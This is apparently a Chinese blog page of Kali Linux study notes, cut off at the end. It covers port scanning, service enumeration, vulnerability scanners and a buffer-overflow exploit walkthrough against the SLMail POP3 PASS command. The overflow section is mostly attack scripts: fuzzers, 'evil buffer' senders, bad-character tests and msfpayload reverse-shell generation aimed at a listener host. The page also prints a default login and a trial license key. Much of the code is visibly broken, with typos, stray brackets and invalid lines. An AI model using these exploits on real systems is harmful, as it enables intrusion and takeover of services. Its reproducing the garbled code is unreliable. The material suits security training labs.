所有TCP扫描方式都是基于三次握手的变化来判断目标端口状态</code></pre><blockquote><p>隐蔽端口扫描</p><ul><li>Syn-syn.ack-rst</li><li>Scapy<ul><li>srl(IP(dst=”your ip address”)/TCP(dport=80),timeout=1,verbose=1)</li><li>./syn_scan.py</li></ul></li><li>namp<ul><li>nmap -sS 1.1.1.1 -p 80.21.25.110 443</li><li>nmap -sS 1.1.1.1 -p –65535 –open</li><li>nmap -sS 1.1.1.1 -p –open</li><li>nmap -sS -iL iplist.txt -p 80</li></ul></li><li>hping3<ul><li>hping3 1.1.1.1 –scan 80 -S</li><li>hping3 1.1.1.1 –scan [ip] -S</li><li>hping3 1.1.1.1 –scan 0-65535 -S</li><li>hping3 -c 10 -S –spoof [伪造IP] -p ++1 1.1.1.1.3<br>全连接端口扫描</li><li>Scapy </li><li>Syn扫描不需要raw packets</li><li>内核认为syn/ack是非法包,直接发rst中断连接</li><li>全连接扫描对scapy比较困难</li><li>sr1(IP(dst=”<a href="http://www.baidu.com&quot;)/TCP(dport=22,flags=&#39;S&#39;)" target="_blank" rel="noopener">www.baidu.com&quot;)/TCP(dport=22,flags=&#39;S&#39;)</a>)</li><li>./tcp_scan1.py</li><li>./tcp_scan2.py</li><li>iptables(Linux防火墙) -A OUTPUT -p tcp –tcp–flags RST RST -d “<a href="http://www.baidu.com&quot;" target="_blank" rel="noopener">www.baidu.com&quot;</a> -j DROP</li><li>nmap</li><li>nmap -sT 1.1.1.1 -p 80</li><li>nmap -sT 1.1.1.1 -p 80.21.25</li><li>nmap -sT 1.1.1.1 -p 80-200</li><li>nmap -sT iplist.txt -p 80</li><li>默认1000个常用端口</li><li>dmiltry</li><li>功能简单,但使用简便</li><li>默认150个最常用的端口</li><li>dmiltry -p 172.16.36.135</li><li>dmiltry -p 172.16.36.135 -o output</li><li>nc</li><li>nc -nv -w 1 -z [your ip address ] 1-100</li><li>for x in ${seq 20 30}; do nc -nv -w 1 -z 1.1.1.1 $x; done | grep open</li><li>for x in $(seq 1 254); do nc -nv -w 1 -z 1.1.1.$x 80; done<br>僵尸扫描(条件苛刻 需要合格的僵尸机)</li><li>合格的僵尸机:xp系统,windows 2003 server</li><li>Scapy-zombie.py<ul><li>i=IP()</li><li>t=TCP()</li><li>rz=(i/f)</li><li>rt=(i/t)</li><li>rz[IP].dst=IPz</li><li>rz[TCP].dport=445</li><li>rt[IP].src=IPz</li><li>rt[IP].dst=IPt</li><li>rt[TCP].dport=22</li><li>az1=sr1(rz)  / at=sr1(rt)  / az2=sr1(rz)</li><li>az1.dsiplay() / az2.display()</li></ul></li><li>xp:僵尸机,metasploit:目标机,kali:扫描机</li><li>nmap</li></ul></li><li>发现僵尸机<ul><li>nmap -p445  <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> –script=ipideseq nse </li></ul></li><li>扫描目标<ul><li>nmap 172.16.36.135 -sl 172.16.36.134 -Pn -p 0-100<br>服务扫描</li></ul></li><li>识别开放端口上运行的应用</li><li>识别目标操作系统</li><li>提高攻击效率<ul><li>Banner捕获</li><li>服务识别</li><li>操作系统识别</li><li>SNMP分析</li><li>防火墙识别<br>Banner捕获</li></ul></li><li>软件开发商</li><li>软件名称</li><li>服务类型</li><li>版本号<ul><li>直接发现已知的漏洞和弱点</li></ul></li><li>连接建立后直接获取banner</li><li>另类服务识别方法<ul><li>特征行为和响应字段</li><li>不同的响应可用于识别底层操作系统</li></ul></li><li>基本操作<ul><li>way1: nc -nv [your ip address]</li><li>way2:python socket:socket 模块用于连接网络服务 </li></ul></li></ul></blockquote><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">banner=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">banner.connect((&quot;www.baidu.com&quot;,21))</span><br><span class="line">banner.recv(4096)   # 接收数据大小</span><br><span class="line">banner.close()</span><br><span class="line">exit()</span><br></pre></td></tr></table></figure><pre><code>- Banner不允许抓取,recv无返回将挂起- way3:     - dmitry -p www.baidu.com    - dmitry -pb www.baidu.com- way4:    - nmap -sT [ip address] -p 22 --script=banner nse- way5:    - amap -B &quot;ip address&quot;    - amap -B &quot;ip address&quot; 1-65535    - amap -B &quot;ip address&quot; 1-65535 | grep on    - amap [ip address]    - amap [ip address] -q    - amap [ip address] -qb</code></pre><ul><li>Banner 信息抓取能力有限</li><li>nmap响应特征分析识别服务<ul><li>发送系列复杂的探测</li><li>依据响应特征signature</li></ul></li><li>nc -nv 1.1.1.1 80</li><li>nmap 1.1.1.1 -p 80 -sV</li></ul><blockquote><p>SNMP</p><ul><li>简单网络管理协议</li><li>Community strings</li><li>信息查询或重新配置</li><li>识别和绕过防火墙筛选<br>操作系统识别<ul><li>操作系统识别技术</li><li>种类繁多</li><li>好产品采用多种技术组合</li><li>TTL起始值</li><li>Windows: 128(65-128)</li><li>Linux/Unix:64 (1-64)</li><li>某些Unix:255</li><li>python脚本</li></ul></li></ul></blockquote><pre><code>from scapy.all import *win=&quot;1.1.1.1&quot;lin=&quot;1.1.1.2&quot;aw=sr1(IP(dst=win)/ICMP())al=sr1(IP(dst=linu)/ICMP())if al[IP].ttl&lt;64   print &quot;host is linux&quot;else   print &quot;host is windows&quot;</code></pre><ul><li>nmap使用多种技术识别操作系统<ul><li>nmap 1.1.1.1 -O</li><li>系统服务特征</li></ul></li><li>xprobe2 1.1.1.1<ul><li>结果有误差</li></ul></li><li>被动操作系统识别<ul><li>IDS</li><li>抓包分析</li><li>被动扫描</li><li>p0f<ul><li>结合ARP地址欺骗识别全网OS<blockquote><p>SNMP扫描</p></blockquote></li></ul></li></ul></li><li>snmp(简单网络管理协议)<ul><li>信息的金矿</li><li>经常被错误配置</li><li>public/private/manager</li></ul></li><li>MIB Tree (查用常用操作系统和设备信息)<ul><li>SNMP Management information Base(MIB)</li><li>树形的网络设备管理功能数据库</li><li>1.3.6.1.4.77.1.2.25</li></ul></li><li>onesixtyone 1.1.1.1 public</li><li>onesixtyone -c dict.txt -i hosts -o my.log -w 100</li><li>snmpwalk 1.1.1.1 -c public -v 2c</li><li>用户<ul><li>snmpwalk -c public -v 2c 1.1.1.1 1.36.1.4.1.77.1.2.25</li></ul></li><li>snmpcheck -t [input ip address]</li><li>snmpcheck -t [input ip address] -c private -v 2</li><li>snmpcheck -t [input ip address] -w<blockquote><p>SMP 扫描</p><ul><li>Server Message Block协议<ul><li>微软历史上出现安全最多的协议</li><li>实现复杂</li><li>默认开放</li><li>文件共享</li><li>空会话未身份认证访问(SMBI)<ul><li>密码策略</li><li>用户名</li><li>组名</li><li>机器名</li><li>用户,组SID</li></ul></li></ul></li></ul></blockquote></li><li>nmap -v -p139,445 192.168.60.1-20</li><li>nmap 192.168.60.4 -p139,445 –script=smb-os-discovery.nse</li><li>nmap -v -p139,445 –script=smb-vuln-*.nse –script-orgs=unsafe=1.1.1.1</li><li>namp:脚本位置: /usr/share/nmap/scripts</li><li>nbtscan -r 192.168.60.0/24</li><li>enum4linux -a 192.168.60.10<br><img src="https://s2.ax1x.com/2020/03/01/3cmkHU.png" alt="3cmkHU.png"><blockquote><p>SMTP 扫描</p><ul><li>nc -nv 1.1.1.1 25</li><li>VRFY root</li><li>nmap smtp.163.com -p25 –script=smtp-enum-users.nse –script-args=smtp-enum-users.methods={VRFY}</li><li>nmap smtp.163.com -p25 –script=smtp-open-relay.nse</li><li>smtp-user-enum -M VRFY -U users.txt -t 1.1.1.1</li><li>./smtp.py<br><img src="https://s2.ax1x.com/2020/03/01/3cmEEF.png" alt="3cmEEF.png"><br>防火墙识别</li></ul></blockquote></li><li>通过检查回包,可能识别端口是否经过防火墙过滤</li><li>设备多种多样,结果存在一定误差<br><img src="https://s2.ax1x.com/2020/03/01/3cmVN4.png" alt="3cmVN4.png"></li><li>scapy</li><li>python 脚本</li><li>namp <ul><li>nmap有系列防火墙检测功能</li><li>nmap -sA 172.16.36.135 -p 22<blockquote><p>负载均衡识别</p></blockquote></li></ul></li><li>广域网负载均衡<ul><li>DNS</li></ul></li><li>HTTP-Loadbalancing<ul><li>Nginx</li><li>Apache</li></ul></li><li>lbd <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></li><li>lbd mail.163.com <blockquote><p>WAF识别</p></blockquote></li><li>WEB应用防火墙</li><li>wafw00f -l</li><li>wafw00f <a href="http://www.microsoft.com" target="_blank" rel="noopener">http://www.microsoft.com</a></li><li>nmap <a href="http://www.microsoft.com" target="_blank" rel="noopener">www.microsoft.com</a> –script=http-waf-detect.nse</li><li>实际可绕过,需要使用机器学习,结合语法,词法几乎可完全避免sql等web攻击</li></ul><blockquote><p>NMPA补充(强大的扫描器)</p><ul><li>所有参数<ul><li>主机发现 <ul><li>sn: 不做端口扫描</li><li>Pn: 不管是否回复,扫描所有要扫的ip,再判断</li><li>PS/PA/PU/PY</li><li>PE/PP//PM</li><li>PO</li><li>-n/-R:不做DNS解析/做解析</li><li>–dns-servers</li><li>–traceroute<ul><li>扫描技术</li></ul></li><li>sS/sT/sWW</li><li>sU (UDP扫描)</li><li>scanflags</li><li>sI:僵尸扫描<ul><li>服务扫描(探测端口服务)</li></ul></li><li>sV</li><li>version–intensity</li><li>version-all<ul><li>脚本扫描</li><li>–script-updatedb</li><li>–script-help</li><li>操作系统检测</li><li>osscan-limit 限制操作系统检测</li><li>时间和性能相关</li><li>使得扫描经过一段时间进行重新扫描,不被发现</li><li>–scan-delay [time]</li><li>防火墙/IDS 欺骗,躲避</li><li>D:伪造源地址,增加噪声IP</li><li>S:欺骗源地址</li></ul></li></ul></li></ul></li><li>zenmap(图形化nmap)</li></ul></blockquote><h2 id="Kali-Linux-从入门到精通-九-弱点扫描"><a href="#Kali-Linux-从入门到精通-九-弱点扫描" class="headerlink" title="Kali Linux 从入门到精通(九)-弱点扫描"></a>Kali Linux 从入门到精通(九)-弱点扫描</h2><blockquote><p>发现弱点</p><ul><li>发现漏洞<ul><li>基于端口服务扫描结果版本信息(速度慢)</li><li>搜索已公开的漏洞数据库(数量大)</li><li>使用弱点扫描器实现漏洞管理<br>从信息的维度定义漏洞管理</li></ul></li><li>信息收集<ul><li>扫描发现网络IP,OS,服务,配置,楼栋号</li><li>能力需求:定义扫描方式内容和目标</li></ul></li><li>信息管理<ul><li>格式化信息,并进行筛选,分组,定义优先级</li><li>能力需求:资产分组,指定所有者,向所有者报告漏洞</li></ul></li><li>信息输出<ul><li>向不同层级的人群展示足够的信息量</li><li>能力需求:生成报告,导出数据,与SIEM集成<br>弱点扫描类型</li></ul></li><li>主动扫描<ul><li>有身份验证</li><li>无身份验证<ul><li>被动扫描</li><li>镜像端口抓包</li><li>其他来源输入</li><li>基于Agent的扫描</li><li>支持平台有限<br>漏洞的基本概念</li></ul></li></ul></li><li>CVSS(Common Vulenrability Scoring System)<ul><li>通用漏洞评分系统</li><li>描述安全漏洞严重程度的统一评分方案</li><li>V 3 版本—2015年6月10日</li><li>Basic Metric:基础的恒定不变的弱点权重</li><li>Temporal Metric:依赖时间因素的弱点的权重<ul><li>Environment Metric:利用弱点的环境要求和实施难度的权重<br><img src="https://s2.ax1x.com/2020/03/01/3cmKjx.png" alt="3cmKjx.png"></li></ul></li></ul></li><li>CVSS<ul><li>CVSS是安全内容自动化协议(SCAP)的一部分</li><li>通常CVSS和CVE一同由美国国家漏洞库(NVD)发布并保持数据的更新</li><li>分值范围: 0-10</li><li>不同机构按CVSS分值的的定义威胁的中,高,低威胁级别</li><li>CVSS体现弱点的风险,威胁级别(serverity)表示弱点风险对企业的影响程度</li><li>CVSS分值是工业标准,但威胁级别不是<br><img src="https://s2.ax1x.com/2020/03/01/3cmlDK.png" alt="3cmlDK.png"></li></ul></li><li>Vulerabilty Reference</li><li>CVE(Common Vulenrable and Exposures)<ul><li>已公开的信息安全漏洞字典,统一的漏洞编号标准</li><li>MITRE公司负责维护(非盈利机构)</li><li>扫描器的大部分扫描项都对应一个CVE编号</li><li>实现不同厂商之间信息交换的统一标准<br><img src="https://s2.ax1x.com/2020/03/01/3cmQu6.png" alt="3cmQu6.png"><ul><li>CVE发布流程</li></ul></li><li>发现漏洞</li><li>CAN负责制定CVE ID</li><li>发布到CVE List —– CVE-2008-4250</li><li>MITRE 负责对内容进行编辑维护</li></ul></li><li>很多厂商维护自己的Vulnerability Refernce<ul><li>MS</li><li>MSKB</li></ul></li><li>其他Vulnerability Reference<ul><li>CERT TA08-297A</li><li>BID 31874</li><li>IAVM 2008-A-0081</li><li>OVAL OVAL6093</li></ul></li><li>OVAL(Open Vulenrabilty and Assessment Language)<ul><li>描述漏洞检测方法的机器可识别语言</li><li>详细的描述漏洞检测的技术细节,可导入自动化检测工具中实施</li><li>OVAL使用XML语言描述,包含了严密的语言逻辑</li></ul></li><li>CCE <ul><li>描述软件配置缺陷的一种标注化格式</li><li>在信息安全风险评估中,配置缺陷的检测是一项重要内容,使用CCE可以让配置缺陷以标准的方式展现出来,便于配置缺陷评估的可量化操作</li></ul></li><li>CPE(Common Product Enumernation)<ul><li>信息技术产品,系统,软件包的结构化命名规范,分类命名</li></ul></li><li>CWE(Common Weakness Enumeration)<ul><li>常见漏洞类型的字典,描述不同类型漏洞的特征(访问控制,信息泄露,拒绝服务)</li></ul></li><li>Security Content Automation Protocal(SCAP)<ul><li>SCAP 是一个集合了多种安全标准框架</li><li>6个元素:CVE,OVAL,CCE,CPE,CVSS,XCCDF</li><li>目的是以标准的方法展示和操作安全数据</li><li>由NIST负责维护</li></ul></li><li>SCAP主要解决三个问题<ul><li>实现高层政策法规等到底层实施的落地(如FISMA,ISO2700系列)</li><li>将信息安全所设计的各个要素标准化(如统一漏洞命以及严重性度量)</li><li>将复杂的系统配置核查工作自动化</li></ul></li><li>SCAP是当前美国比较成熟的一套信息安全评估标准体系,其标准化,自动化的思想对信息安全行业产生了深远的影响</li><li>NVD(National Vulnerabilty Database)<ul><li>美国政府的漏洞管理标准数据</li><li>完全基于SCAP框架</li><li>实现自动化漏洞管理</li><li>包含一下库 <ul><li>安全检查列表</li><li>软件安全漏洞</li><li>配置错误</li><li>产品名称</li><li>影响度量<br>漏洞管理<ul><li>周期性扫描跟踪漏洞</li><li>高危漏洞优先处理</li><li>扫描注意事项</li><li>漏洞管理三要素</li><li>准确性sssss9</li><li>时间</li><li>资源<br>NMAP  </li></ul></li></ul></li></ul></li><li>nmap 扫描脚本<ul><li>400+</li><li>分类</li></ul></li><li>cat /usr/share/nmap/scripts/script.db</li><li>grep vuln /usr/share/nmap/scripts/script.db | cut -d “&quot; -f 2</li><li>cat /usr/share/nmap/scripts/smb-check-vulns.nse</li><li>smb-check-vulns.nse<ul><li>nmap -sU –script=smb-check-vulns.nse –script-args=unsafe=1 -p U:137,139,445 1.1.1.1</li><li>MS08-067</li></ul></li><li>smb-vuln-ms 10-061.nse<ul><li>Stuxnet蠕虫利用的4个漏洞之一</li><li>Print Spooler权限不当 打印请求可在系统目录可创建文件,执行任意代码</li><li>LANMAN API 枚举共享打印机</li><li>远程共享打印机名称</li><li>smb-enum-shares枚举共享<ul><li>身份认证参数-smbuser,smbpassword</li><li>nmap -p445 –script=smb-enum-shares.nse –script-args=smbuser=admin,smbpassword=pass 1.1.1.1</li></ul></li><li>Windows XP,Server 2003 SP2,Vista,Server 2008,win7</li></ul></li><li>影响扫描结果的因素<br>弱点扫描器-OPENVAS<ul><li>Openvas</li></ul></li><li>Nessus项目分支</li><li>管理目标系统的漏洞</li><li>免费开源</li><li>kali默认安装.但未配置和启动<ul><li>早期Openvas配置</li></ul></li><li>安装</li><li>创建证书</li><li>同步弱点数据库</li><li>重建数据库</li><li>备份数据库</li><li>启动服务装入插件</li><li>创建管理员账号</li><li>创建普通用户账号</li><li>配置服务侦听端口</li><li>安装验证<br><img src="https://s2.ax1x.com/2020/03/01/3cm1HO.png" alt="3cm1HO.png"><ul><li>Openvas组件</li></ul></li><li>OpenVAS Manager  <ul><li>控制scanner和其他manager的中心组件</li><li>控制中心数据库,保存用户配置及扫描结果</li><li>客户端使用基于XML的无状态OMP协议与通信</li><li>集中排序筛选,使客户端获得一致展现</li></ul></li><li>OpenScanner<ul><li>具体执行Network Vulnerability Tests(NVTs)</li><li>NVTs 每天通过Feed更新</li><li>受Manager控制</li></ul></li><li>OSP Scanner<ul><li>可以统一管理多个scanner</li><li>将一组scanner作为一个对象交给manager</li></ul></li><li>Greebone Security Assistant(GSA)<ul><li>提供Web Service</li></ul></li><li>OpenVAS CLI<ul><li>omp命令行工具,可实现批处理控制manager</li></ul></li><li>更新很快<ul><li>所有找到的资料集合都已不同程度的过时了<ul><li>现在安装Openvas</li></ul></li></ul></li><li>初始化安装<ul><li>openvas-setup</li></ul></li><li>检查安装结果<ul><li>openvas-check-setup</li></ul></li><li>查看当前账号<ul><li>openvasmd –list-users</li></ul></li><li>修改账号密码<ul><li>openvasmd –user=admin-new -password=password</li></ul></li><li>升级<ul><li>openvas-feed-update<ul><li>扫描配置</li></ul></li></ul></li><li>扫描windows</li><li>扫描LInux</li><li>扫描网络设备<ul><li>扫描任务</li></ul></li><li>进度</li><li>报告<ul><li>小结</li></ul></li><li>不是秘笈而是经验</li><li>vi /usr/bin/openvas-start<br>NESSUS<ul><li>家庭版<ul><li>免费</li></ul></li><li>专业版<ul><li>收费,无限的并发连接</li></ul></li><li>下载</li><li><a href="http://www.tenable.com/products/nessus/select-your-operating-system" target="_blank" rel="noopener">http://www.tenable.com/products/nessus/select-your-operating-system</a></li><li>安装</li><li>dpkg -i </li><li>安装路径: /opt/nessus</li><li>启动服务</li><li>/etc/init.d/nessusd start</li><li>策略</li><li>扫描</li><li>扫描主机</li><li>扫描windows</li><li>扫描linux</li><li>扫描网络设备</li><li>扫描 web server</li><li>报告</li><li>调度<br>NEXPOSE</li><li>Rapid 7</li><li>Nexpose</li><li>完整的漏洞管理实现</li><li>环境准备</li><li>建立 VM 4G 内存</li><li><a href="http://downloads2.rapid7/download/NeXpose-v4/NexposeVA.ova" target="_blank" rel="noopener">http://downloads2.rapid7/download/NeXpose-v4/NexposeVA.ova</a></li><li><a href="https://IP_addr:3780" target="_blank" rel="noopener">https://IP_addr:3780</a> (nxdmin/nxpassword)</li><li>操作系统账号密码:nexpose</li><li><a href="http://www.rapid7.com/products/nexpose/virtual-appliance-enterprise.jsp" target="_blank" rel="noopener">http://www.rapid7.com/products/nexpose/virtual-appliance-enterprise.jsp</a></li><li>K3LQ-5PPS-RTS5-LTS5(14天后到期)</li></ul></li></ul></blockquote><h2 id="Kali-Linux-从入门到精通-十-漏洞挖掘之缓冲区溢出"><a href="#Kali-Linux-从入门到精通-十-漏洞挖掘之缓冲区溢出" class="headerlink" title="Kali Linux 从入门到精通(十)-漏洞挖掘之缓冲区溢出"></a>Kali Linux 从入门到精通(十)-漏洞挖掘之缓冲区溢出</h2><blockquote><p>程序漏洞从哪里来?</p><ul><li>罪恶的根源:变量</li><li>数据与代码边界不清(注入攻击)</li><li>最简漏洞原理-shell 脚本漏洞(本质:输入数据本身,程序本身没做检查导致)<br>缓冲区溢出</li><li>当缓冲区边界限制不严格时,由于变量传入畸形数据或程序运行错误,导致缓冲区被”称暴”,从而覆盖了相邻内存区域的数据</li><li>成功修改内存数据,可造成进程劫持,执行恶意代码,获取服务控制权等后果’<br>如何发现漏洞?<ul><li>源码审计</li><li>逆向工程</li><li>模糊测试<ul><li>向程序堆栈半随机的数据,根据内存变化判断溢出</li><li>数据生成器,生成随机,半随机数据</li><li>测试工具,识别溢出漏洞(动态调试工具:IDA,OD)<br>Windows系统缓冲区溢出</li></ul></li><li>FUZZING(模糊测试)<ul><li>准备环境<ul><li>SLMail 5.5.0 Mail Server</li><li>immunityDebugger_1_85_setup.exe</li><li>mona.py</li></ul></li><li>POP3 PASS 命令存在缓冲区溢出漏洞</li><li>无需身份验证实现远程代码执行</li><li>windows防护机制<ul><li>DEP:阻止代码从数据页被执行(软硬件实现)</li><li>ASLR:随机内存地址加载执行程序和DLL,每次重启地址变化 </li></ul></li></ul></li><li>POP3<ul><li>NC 110 端口</li><li>了解未知协议<ul><li>Wireshark</li><li>RFC</li></ul></li><li>01.py<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> #!/bin/python</span><br><span class="line"> import socket</span><br><span class="line"> s=socket(socket.AF_INET,socket.SOCK_STREM)</span><br><span class="line"> try:</span><br><span class="line">      print &quot;\nSending evil buffer...&quot;</span><br><span class="line">      s.connect((&apos;1.1.1.1&apos;,110))</span><br><span class="line">      data=s.recv(1024)</span><br><span class="line">      print data</span><br><span class="line"></span><br><span class="line">      s.send(&apos;USER xxx&apos;+&apos;\r\n&apos;)</span><br><span class="line">      data=s.recv(1024)</span><br><span class="line">      print data</span><br><span class="line">      </span><br><span class="line">      s.send(&apos;PASS test\r\n&apos;)</span><br><span class="line">      data=s.recv(1024)</span><br><span class="line">      print data</span><br><span class="line"></span><br><span class="line">      s.close()</span><br><span class="line">      print &quot;\nDone!&quot;</span><br><span class="line">except:</span><br><span class="line">      print &quot;Could not connext to POP3!&quot;</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul></blockquote><ul><li><p>FUZZING(way 1)</p><ul><li>测试PASS 命令收到大量数据时是否发生溢出</li><li>EIP寄存器存放下一条指令的地址</li><li>02.py<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket </span><br><span class="line">buffer=[&quot;A&quot;]</span><br><span class="line">counter=100</span><br><span class="line">while len(buffer)&lt;=50:</span><br><span class="line">    buffer.append(&quot;A&quot;*counter)</span><br><span class="line">    counter=counter+200</span><br><span class="line">for string in buffer:</span><br><span class="line">    print &quot;Fuzzing PASS with %s bytes&quot; % len(string)</span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    connect=s.connect((&apos;1.1.1.1.1&apos;,110))</span><br><span class="line">    s.recv(1024)</span><br><span class="line">    s.send(&apos;USER test&apos;+&apos;\r\n&apos;)</span><br><span class="line">    s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS&apos;+string+&apos;\r\n&apos;)</span><br><span class="line">    s.send(&apos;QUIT\r\n&apos;)</span><br><span class="line">    s.close()</span><br></pre></td></tr></table></figure></li></ul></li><li><p>FUZZING(way 2)</p><ul><li><p>2700个字符实现EIP溢出</p></li><li><p>03.py</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import socket </span><br><span class="line">s=soket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=&apos;A&apos;*2600(不断改变数字)</span><br><span class="line">try:</span><br><span class="line">   print &quot;\nSending evil buffer...&quot;</span><br><span class="line">   s.connect((&apos;1.1.1.1&apos;,110))</span><br><span class="line">   data=s.recv(1024)</span><br><span class="line">   s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;)</span><br><span class="line">   print &apos;\nDone!&apos;</span><br><span class="line">except:</span><br><span class="line">   print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure></li><li><p>找到精确溢出的4个字节</p><ul><li>二分法(2700-&gt;2600-&gt;2650)</li><li>唯一字串法<ul><li>kali生成唯一字符串:/sur/share/metasploit/tools/pattern_ create.rb 2700</li></ul></li><li>04.py </li><li>05.py</li></ul></li><li><p>思路: 将EIP修改为shellcode代码的内存地址,将shellcode写入到该地址空间,程序读取EIP寄存器数值,并跳转到shellcode代码段执行 </p></li><li><p>寻找可存放的内存地址空间</p></li><li><p>06.py</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=&quot;A&quot;*2606+&quot;B&quot;*4+C*(3500-2606-4)  # 假设EXP寄存器最大可存放3500个字符</span><br><span class="line">try:</span><br><span class="line">   print &quot;\nSending ing evil buffer...&quot;</span><br><span class="line">   s.connect((&apos;1.1.1.1&apos;,110))</span><br><span class="line">   date=s.recv(1024)</span><br><span class="line">   s.send(&quot;USER TEST&quot;+&apos;\r\n&apos;)</span><br><span class="line">   date=s.recv(1024)</span><br><span class="line">   s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;)\]]]]]]]][[][][][][][][][][ ]]</span><br><span class="line">   print &quot;\nDone!&quot;</span><br><span class="line">except:</span><br><span class="line">   print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>FUZZING:</p><ul><li>不同类型的程序.协议,漏洞,会将某些字符认为是坏字符,这些字符有固定用途</li><li>返回地址,shellcode,buffer中都不能出现坏字符</li><li>null (0x00) 空字符,用于终止字符串的拷贝操作</li><li>return (0x0D) 回车操作,表示POP3 PASS 命令输入完成</li><li>思路:<pre><code>- 发送0x00-0xff 256个字符,查找所有坏字符</code></pre></li><li>07.py<ul><li>坏字符:0x0A,0x00,0x0D<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr]]bin/python</span><br><span class="line">import socket</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">badchars=从0x00-0xff</span><br><span class="line">buffer=&quot;A&quot;*2606+&quot;B&quot;*4+badchars  </span><br><span class="line">try:</span><br><span class="line">   print &quot;\nSending ing evil buffer...&quot;</span><br><span class="line">   s.connect((&apos;1.1.1.1&apos;,110))</span><br><span class="line">   date=s.recv(1024)</span><br><span class="line">   s.send(&quot;USER TEST&quot;+&apos;\r\n&apos;)</span><br><span class="line">   date=s.recv(1024)</span><br><span class="line">   s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;)</span><br><span class="line">   print &quot;\nDone!&quot;</span><br><span class="line">except:</span><br><span class="line">   print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure></li></ul></li></ul><ul><li>FUZZING:<ul><li>重定向数据流<ul><li>用ESP的地址替换EIP的值</li><li>但是ESP地址变化,硬编码不可行</li><li>SLMail 线程应用程序,操作系统为每个线程分配一段地址范围,每个线程地址范围不确定</li></ul></li><li>变通思路:<ul><li>在内存中寻找地址固定的系统模块</li><li>在模块中寻找JMP ESP指令的地址跳转,再由该指令间接跳转到ESP,从而执行shellcode</li><li>mona.py脚本识别内存模块,搜索”return address”是JMP ESP指令的模块</li><li>寻找无EDP,ASLR保护的内存地址</li><li>内存地址不包含坏字符<br>  mona find -s “二进制地址(可使用16进制转换工具)” -m xxx.dll</li><li>生成shellcode</li><li>Scratch</li><li>./msfpayload -l<br><img src="https://s2.ax1x.com/2020/03/01/3cmfK0.png" alt="3cmfK0.png"></li><li>./msfpayload win32_reverse LHOST=192.168.20.8 LPORT=443 -C<br><img src="https://s2.ax1x.com/2020/03/01/3cm22n.png" alt="3cm22n.png"></li><li>./msfpayload win32_reverse LHOST=10.0.2.15 444 R | ./msfencode -b “\x00\x0a\x0d”</li><li>nc -vlp 443</li><li>09.py<ul><li>\x90:nop指令</li><li>防止shellcode被清除前几个字节</li><li>提权侵入,拿shell</li></ul></li></ul></li></ul></li></ul></li><li><p>shellcode执行结束后以exit方式退出整个结束,将导致邮件服务崩溃</p></li><li><p>Smail是一个基于线程的应用,使用ExitThread方式可避免整个服务崩溃,可实现重复溢出</p><blockquote><p>FUZZING:远程桌面操控受控机</p></blockquote></li><li><p>windows:配置信息在注册表</p></li><li><p>RegSnap 工具</p></li><li><p>提权后远程操控指令:</p></li></ul><blockquote><p>Linux缓冲区溢出 - - 穿越火线缓冲区溢出</p><ul><li>1.环境搭建:<ul><li>Crossfire(穿越火线)<ul><li>多人在线RPG游戏</li><li>1.9.0版本接受入站 